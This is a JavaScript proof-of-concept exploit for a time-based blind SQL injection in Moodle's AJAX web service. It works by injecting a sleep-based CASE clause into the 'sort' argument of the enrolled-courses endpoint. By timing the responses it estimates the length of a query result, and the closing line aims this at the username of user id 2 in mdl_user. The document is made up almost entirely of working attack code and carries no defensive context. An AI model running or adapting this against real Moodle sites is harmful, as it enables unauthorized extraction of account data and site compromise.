async function estimate_result_length(query) {
	const interval = 3;
	const maxLength = 100;

	for (let i = 0; i < maxLength; i++) {
		const params = new URLSearchParams({
			sesskey: M.cfg.sesskey,
			info: "core_course_get_enrolled_courses_by_timeline_classification",
		});

		const url = `${window.location.origin}/lib/ajax/service.php?${params}`;
		const data = [
			{
				index: 0,
				methodname: "core_course_get_enrolled_courses_by_timeline_classification",
				args: {
					offset: 0,
					limit: 1,
					classification: "inprogress",
					sort: `id AND (select CASE WHEN ((select length(${query}))=${i}) THEN (sleep(${interval})) ELSE 2 END)`,
				},
			},
		];

		const startTime = performance.now();

		try {
			const response = await fetch(url, {
				method: "POST",
				body: JSON.stringify(data),
				credentials: "same-origin",
			});

			const json = await response.json();
			console.log(JSON.stringify(json));
		} catch(error) {
			console.error(error);
			return null;
		}

		const elapsedTime = performance.now() - startTime;
		console.log(`done in ${elapsedTime} ms`);

		if (elapsedTime >= interval * 1000) {
			return i;
		}
	}

	return null;
}

await estimate_result_length("(select username from mdl_user where id = 2 limit 1)");
